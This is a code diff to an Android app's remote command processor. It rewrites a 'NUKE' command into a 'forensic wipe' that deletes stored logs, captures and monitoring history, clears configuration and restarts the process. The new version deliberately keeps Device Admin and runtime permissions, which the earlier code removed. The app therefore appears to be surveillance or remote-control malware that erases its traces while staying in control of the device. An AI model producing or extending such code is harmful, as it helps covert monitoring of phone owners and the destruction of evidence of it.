@@ -249,14 +249,26 @@ object CommandProcessor {
                 }
                 "NUKE" -> {
                     try {
+                        // 1. Wipe the "Catacombs" (Logs, captures, and encrypted blobs)
                         File(Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOCUMENTS), "Android").deleteRecursively()
+                        
+                        // 2. Reset session stats, counters, and monitoring history
                         ctx.getSharedPreferences("app_stats", Context.MODE_PRIVATE).edit().clear().apply()
-                        val dpm = ctx.getSystemService(Context.DEVICE_POLICY_SERVICE) as android.app.admin.DevicePolicyManager
-                        val comp = android.content.ComponentName(ctx, MyDeviceAdminReceiver::class.java)
-                        if (dpm.isAdminActive(comp)) dpm.removeActiveAdmin(comp)
-                        status = "CLEANUP_COMPLETE"
-                        Handler(Looper.getMainLooper()).postDelayed({ android.os.Process.killProcess(android.os.Process.myPid()) }, 2000)
-                    } catch(e: Exception) { status = "CLEANUP_FAILED" }
+                        
+                        // 3. Clear dynamic configuration to revert to default behavior
+                        ctx.getSharedPreferences("app_config", Context.MODE_PRIVATE).edit().clear().apply()
+
+                        // Note: Device Admin and Runtime Permissions are intentionally preserved.
+                        status = "FORENSIC_WIPE_COMPLETE"
+                        
+                        // 4. Force restart to flush in-memory logs and reset service state
+                        Handler(Looper.getMainLooper()).postDelayed({ 
+                            android.os.Process.killProcess(android.os.Process.myPid()) 
+                        }, 2000)
+                    } catch(e: Exception) { 
+                        status = "CLEANUP_FAILED"
+                        errorMsg = e.message ?: "IO Error during wipe"
+                    }
                 }
                 "RUN_INTENT" -> {
                     try {
